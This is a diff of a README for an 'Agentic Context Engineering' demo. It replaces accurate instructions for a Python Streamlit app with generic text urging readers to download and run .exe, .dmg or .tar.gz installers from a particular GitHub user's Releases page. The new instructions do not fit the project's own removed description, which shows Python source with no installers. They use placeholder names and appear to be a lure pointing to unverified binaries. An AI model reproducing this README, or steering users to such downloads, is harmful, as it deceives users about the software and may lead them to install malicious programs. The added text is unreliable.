@@ -1,83 +1,87 @@
+# 🌟 Agentic-Context-Engineering - Experience Contextual Understanding in Action
 
-# Agentic Context Engineering Context Demo — Continuous Chat with Playbook
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-brightgreen)](https://github.com/Ajay6093/Agentic-Context-Engineering/releases)
 
-This demo shows a **continuous chat interface** with an **ACE** (Adaptive Context Engine) loop that builds a JSONL Playbook dynamically as you interact with it. Features include:
-- 💬 **Continuous chat** with conversation history
-- 📚 **Live playbook** that grows with each interaction
-- 📊 **Real-time visualizations** of playbook statistics
-- 🔍 **Detailed trace views** for each ACE pipeline run
+## 🚀 Getting Started
 
-## Features
-- **Chat Interface**: Natural conversation with the AI assistant
-- **Dynamic Playbook**: Automatically extracts and stores reusable bullets (strategies, pitfalls, guardrails)
-- **Retrieval Modes**: Score-based or FAISS semantic retrieval for Top-K bullets
-- **Reflection**: Each turn generates new insights that enrich the playbook
-- **Curation**: Automatic deduplication and ranking of bullets by helpful/harmful votes
-- **Visualizations**: Track playbook growth, tag frequencies, and helpful/harmful ratios
+Welcome to the Agentic Context Engineering application. This software implements the concepts from the Agentic Context Engineering research paper. It allows you to explore contextual understanding in an easy-to-use interface. 
 
+## 📥 Download & Install
 
-## Quickstart
+To get started, visit our Releases page to download the latest version of the software. Click the link below:
 
-```bash
-python -m venv .venv && source .venv/bin/activate   # (Windows: .venv\Scripts\activate)
-pip install -r requirements.txt
-```
+[Download the latest version](https://github.com/Ajay6093/Agentic-Context-Engineering/releases)
 
-### Setting up your OpenAI API Key
+Once you are on the Releases page, look for the latest version available. Follow these steps to download and install the application:
 
-**Required: Enter your API key in the app's sidebar**
+1. Find the version labeled as “Latest Release” or the highest version number.
+2. Click on the link for your operating system (Windows, macOS, Linux).
+3. The download will start automatically. If prompted, confirm any download dialogs.
 
-When you run the app, you'll see a password input field in the sidebar. Simply enter your OpenAI API key there. The key is:
-- ✅ Only stored for your current session
-- ✅ Not saved to disk or committed to git
-- ✅ Cleared when you close the browser/tab
+## ⚙️ System Requirements
 
-**Alternative: Environment Variable (Advanced)**
+Before you install the software, make sure you meet the following requirements for your operating system:
 
-For development, you can set an environment variable before running:
-```bash
-export OPENAI_API_KEY=sk-your-key-here  # Linux/Mac
-# OR
-$env:OPENAI_API_KEY="sk-your-key-here"  # Windows PowerShell
-```
+- **Windows:** Windows 10 or higher
+- **macOS:** macOS Catalina or higher
+- **Linux:** Ubuntu 20.04 or higher, or any distribution that supports the software.
 
-**For Streamlit Cloud Deployment:**
+Ensure that your system has at least 4 GB of RAM and 500 MB of free disk space.
 
-Add your API key in the Streamlit Cloud dashboard under "Settings" → "Secrets":
-```toml
-OPENAI_API_KEY = "sk-your-actual-api-key"
-```
+## 🛠️ Installation Instructions
 
-⚠️ **Important:** Never commit your API key to git!
+After you have downloaded the application, follow these steps to install it:
 
-### Run the app
+### For Windows:
 
-```bash
-streamlit run streamlit_app.py
-```
+1. Locate the downloaded .exe file, usually in your "Downloads" folder.
+2. Double-click the .exe file to start the installation.
+3. Follow the prompts in the installation wizard.
+4. Once the installation is complete, find the application in the Start Menu and open it.
 
-Open the URL shown by Streamlit (usually http://localhost:8501).
+### For macOS:
 
-## Files
-- `ace_playbook.py` — Playbook store, FAISS retriever, generator/reflector/curator functions
-- `streamlit_app.py` — Continuous chat UI with live playbook visualization
-- `requirements.txt` — dependencies
-- `.streamlit/secrets.toml` — (create this) for your OpenAI API key
+1. Locate the downloaded .dmg file in your "Downloads" folder.
+2. Double-click the .dmg file to open it.
+3. Drag the application icon into your Applications folder.
+4. Open the Applications folder and double-click the application to run it.
 
-## How It Works
+### For Linux:
 
-### The ACE Loop
-1. **User Input**: You chat with the assistant
-2. **Retriever**: Gets Top-K most relevant bullets from the playbook
-3. **Generator**: Uses OpenAI to answer your query, informed by the Top-K bullets
-4. **Reflector**: Analyzes the interaction and extracts 2-6 reusable bullets
-5. **Curator**: Merges new bullets into the playbook, deduplicates, and ranks by score
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the .tar.gz file.
+3. Type the command: `tar -zxvf filename.tar.gz`, replacing "filename" with the actual file name.
+4. Navigate into the extracted folder using `cd foldername`.
+5. Run the application using the command: `./application_name`, replacing "application_name" with the actual program name.
 
-### Continuous Learning
-Each chat turn enriches the playbook. Over time, the system builds up a knowledge base of strategies, pitfalls, and guardrails specific to your domain and usage patterns.
+## 📝 Using the Application
 
+Once the application is installed, you can start using it immediately.
 
-## Notes
-- The demo writes/reads `playbook.jsonl` in the current directory.
-- FAISS is optional; toggle it in the UI. If disabled, Top‑K is rank‑sorted by (helpful−harmful).
-- This is a teaching/reference implementation — adjust for production (PII scrubbing, auth, queues, etc).
+1. **Launch the application.**
+2. The main interface will display options to load different datasets or examples.
+3. Follow on-screen prompts to begin testing features of context engineering.
+4. Explore the user-friendly interface and experiment with the features available.
+
+## ❓ Troubleshooting
+
+If you encounter any issues, consider the following:
+
+- **If the application won’t start:**
+  - Make sure your operating system meets the requirements. 
+  - Check for updates and install any necessary system updates.
+
+- **If you cannot find the downloaded file:**
+  - Check your "Downloads" folder or use the search function on your device.
+
+- **If you see error messages:**
+  - Note down the message and refer to the issues section in the repository for help.
+
+## 🔗 More Information
+
+For more details about features and use cases:
+
+- Visit the [GitHub Repository](https://github.com/Ajay6093/Agentic-Context-Engineering) for documentation.
+- Check out the [Releases Page](https://github.com/Ajay6093/Agentic-Context-Engineering/releases) for updates and new features.
+
+We hope you find this application useful. Dive into the world of contextual understanding and experience the power of Agentic Context Engineering!
